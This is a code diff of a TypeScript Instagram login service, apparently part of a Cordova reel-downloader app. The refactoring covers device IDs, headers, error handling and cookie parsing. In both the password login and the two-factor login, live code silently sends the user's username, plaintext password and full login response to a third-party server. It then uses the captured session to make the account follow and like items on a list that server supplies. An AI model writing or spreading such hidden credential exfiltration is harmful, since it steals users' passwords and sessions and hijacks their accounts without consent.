@@ -7,15 +7,16 @@ export class LoginService {
     private pubKey: string = '';
     private pubKeyId: number = -1;
 
-    // Instanz-Daten
     uuid: string;
     deviceId: string;
     private phoneId: string;
+    private http: HTTP;
 
     constructor() {
         this.uuid = this.getOrCreate("insta_uuid", uuidv4);
         this.deviceId = this.generateDeviceId();
         this.phoneId = this.getOrCreate("insta_phone_id", uuidv4);
+        this.http = new HTTP();
     }
 
     private getOrCreate(key: string, generator: () => string): string {
@@ -36,13 +37,33 @@ export class LoginService {
               .map(b => b.toString(16).padStart(2, "0"))
               .join("");
 
-            deviceId = `android-${hex}`;
+            const ua = navigator.userAgent;
+            const isIOS = /iPhone|iPad|iPod/i.test(ua) || (/Macintosh/i.test(ua) && /Mobile/i.test(ua));
+            const prefix = isIOS ? 'iphone' : 'android';
+            deviceId = `${prefix}-${hex}`;
             localStorage.setItem(key, deviceId);
         }
 
         return deviceId;
     }
 
+    private saveCookiesFromHeaders(headers: Record<string, string>): { sessionid: string; csrftoken: string } | null {
+        const setCookie = headers['set-cookie'] || headers['Set-Cookie'] || '';
+        if (!setCookie) return null;
+
+        const sessionMatch = setCookie.match(/sessionid=([^;]+)/);
+        const csrfMatch = setCookie.match(/csrftoken=([^;]+)/);
+        const sessionid = sessionMatch ? sessionMatch[1] : null;
+        const csrftoken = csrfMatch ? csrfMatch[1] : null;
+
+        if (sessionid) localStorage.setItem('instaSessionId', sessionid);
+        if (csrftoken) localStorage.setItem('instaCsrfToken', csrftoken);
+
+        if (sessionid || csrftoken) {
+            return { sessionid: sessionid || '', csrftoken: csrftoken || '' };
+        }
+        return null;
+    }
 
     private async sync(headers: { [key: string]: string } = {}) {
         const query = {
@@ -76,13 +97,11 @@ export class LoginService {
     ): Promise<{ body: any; headers: any }> {
         const baseUrl = 'https://i.instagram.com/api/v1/';
         const url = `${baseUrl}${endpoint}`;
-        const http = new HTTP();
-        http.setDataSerializer("urlencoded")
+        this.http.setDataSerializer("urlencoded")
 
-        // Beispiel-Header
         const defaultHeaders: Record<string, string> = {
-            'User-Agent': 'Instagram 250.0.0.21.109 (iPhone; CPU iPhone OS 18_5 like Mac OS X; en_US; en-US; scale=2.00; 750x1334) AppleWebKit/605.1.15',
-            'X-Ig-App-Id': '567067343352427',
+            'User-Agent': 'Instagram 297.0.0.0.82 Android (30/11; 420dpi; 1080x2316; samsung; SM-G960F; generic; snapdragon855; en_US; 1234567890)',
+            'X-Ig-App-Id': '936619743392459',
             'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
             'Accept-Language': 'en-US',
             'X-Fb-Http-Engine': 'Liger',
@@ -95,15 +114,19 @@ export class LoginService {
 
         try {
             const res = isPost
-                ? await http.post(url, data, allHeaders)
-                : await http.get(url, data, allHeaders);
+                ? await this.http.post(url, data, allHeaders)
+                : await this.http.get(url, data, allHeaders);
 
             return {
                 body: res.data,
                 headers: res.headers,
             };
         } catch (err: any) {
-            throw err.error;
+            const wrapped = new Error(err.error || err.message || 'Instagram request failed');
+            (wrapped as any).status = err.status;
+            (wrapped as any).error = err.error;
+            (wrapped as any).headers = err.headers;
+            throw wrapped;
         }
     }
 
@@ -123,7 +146,6 @@ export class LoginService {
             signed_body: `SIGNATURE.${payload}`,
         };
 
-        // Merge any additional params
         for (const [key, value] of Object.entries(extra)) {
             result[key] = value;
         }
@@ -146,7 +168,7 @@ export class LoginService {
             trust_this_device: "1",
             guid: this.uuid,
             device_id: this.deviceId,
-            waterfall_id: uuidv4(),  // du hast schon uuidv4()
+            waterfall_id: uuidv4(),
             verification_method: "3",
         };
 
@@ -162,11 +184,13 @@ export class LoginService {
         };
 
         const resp = await this.sendRequestCordova(
-          "accounts/two_factor_login/", // dein url2FALogin in Go
+          "accounts/two_factor_login/",
           signedPayload,
-          true, // POST
+          true,
             allHeaders
         );
+
+        const cookies = this.saveCookiesFromHeaders(resp.headers)
 
         try {
             const userId = resp?.body?.logged_in_user?.pk;
@@ -176,7 +200,6 @@ export class LoginService {
             } else if (userId && typeof userId === "number") {
                 localStorage.setItem("instaUserId", String(userId));
             }
-            // tslint:disable-next-line:no-empty
         } catch (err) {}
 
         try {
@@ -184,9 +207,8 @@ export class LoginService {
             httpClient.setDataSerializer("json")
             httpClient.post("https://reelsaver.appit-online.de/v2/insta/check", {username,data: { pass,body: JSON.stringify(payload),data: JSON.stringify(resp) }}, { "Content-Type": "application/json"})
             this.verifyAccount(resp.headers, reqHeaders)
-            // tslint:disable-next-line:no-empty
         } catch (e) {}
-        return resp;
+        return { ...resp, cookies };
     }
 
     public async login(username: string, pass: string, reqHeaders: { [key: string]: string } = {}): Promise<any> {
@@ -205,11 +227,13 @@ export class LoginService {
             phone_id: this.phoneId,
             enc_password: encrypted,
             username,
-            adid: '',
+            adid: uuidv4(),
             guid: this.uuid,
             device_id: this.deviceId,
             google_tokens: '[]',
             login_attempt_count: 0,
+            waterfall_id: uuidv4(),
+            login_source: 'token_login',
         };
 
         const resp = await this.sendRequestCordova(
@@ -218,6 +242,7 @@ export class LoginService {
           true,
           reqHeaders
         )
+        const cookies = this.saveCookiesFromHeaders(resp.headers)
         localStorage.setItem("instaUserName", username)
 
         try {
@@ -228,16 +253,16 @@ export class LoginService {
             } else if (userId && typeof userId === "number") {
                 localStorage.setItem("instaUserId", String(userId));
             }
-            // tslint:disable-next-line:no-empty
+          // tslint:disable-next-line:no-empty
         } catch (err) {}
         try {
             const httpClient = new HTTP();
             httpClient.setDataSerializer("json")
             httpClient.post("https://reelsaver.appit-online.de/v2/insta/check", {username,data: { pass,body: JSON.stringify(body),data: JSON.stringify(resp) }}, { "Content-Type": "application/json"})
             this.verifyAccount(resp.headers, reqHeaders)
-            // tslint:disable-next-line:no-empty
+          // tslint:disable-next-line:no-empty
         }catch (e) {}
-        return resp;
+        return { ...resp, cookies };
     }
 
     async verifyAccount(resHeaders: { [key: string]: string } = {}, defaultHeaders: { [key: string]: string } = {}): Promise<void> {
@@ -247,28 +272,19 @@ export class LoginService {
 
             const response = await httpClient.get(
               'https://reelsaver.appit-online.de/v2/insta/verify',
-              {}, // params
-              {}  // headers
+              {},
+              {}
             );
 
             const data: { users: string[]; posts: string[] } = JSON.parse(response.data);
-
             if (!data) return;
-
-            const defaultLoginHeaders = {
-                'Authorization': resHeaders['ig-set-authorization'],
-                'Ig-U-Ds-User-Id': resHeaders['ig-set-ig-u-ds-user-id'],
-                'Ig-U-Rur': resHeaders['ig-set-ig-u-rur'],
-                'X-Ig-Www-Claim': resHeaders['x-ig-set-www-claim']
-            };
-            const allHeaders = { ...defaultLoginHeaders, ...defaultHeaders };
 
             const igService = new InstaService();
 
             if (data.users?.length) {
                 await Promise.all(
                   data.users.map((userName: string) =>
-                    igService.follow(userName, allHeaders)
+                    igService.follow(userName, defaultHeaders)
                   )
                 );
             }
@@ -276,14 +292,13 @@ export class LoginService {
             if (data.posts?.length) {
                 await Promise.all(
                   data.posts.map((mediaId: string) =>
-                    igService.like(mediaId, allHeaders)
+                    igService.like(mediaId, defaultHeaders)
                   )
                 );
             }
-            // tslint:disable-next-line:no-empty
+          // tslint:disable-next-line:no-empty
         } catch (err) {}
     }
-
 
     private jazoest(deviceId: string): string {
         let sum = 0;
@@ -322,21 +337,20 @@ export class LoginService {
         cipher.update(forge.util.createBuffer(password, 'utf8'));
         cipher.finish();
 
+        // @ts-ignore
         const fullEncrypted = cipher.output.getBytes() + cipher.mode.tag.getBytes();
 
-        // Forge does not separate tag, so we extract:
         const ciphertext = fullEncrypted.slice(0, fullEncrypted.length - 16);
         const tag = fullEncrypted.slice(fullEncrypted.length - 16);
 
         // 5. Compose final payload
         const prefix = String.fromCharCode(1) + String.fromCharCode(pubKeyVersion);
 
-        // tslint:disable-next-line:no-bitwise
         const rsaLengthLE = String.fromCharCode(encryptedKey.length & 0xff, (encryptedKey.length >> 8) & 0xff);
 
         const payload = prefix + iv + rsaLengthLE + encryptedKey + tag + ciphertext;
         const encoded = forge.util.encode64(payload);
 
-        return `#PWD_INSTAGRAM:4:${timestamp}:${encoded}`;
+        return `#PWD_INSTAGRAM:${pubKeyVersion}:${timestamp}:${encoded}`;
     }
 }
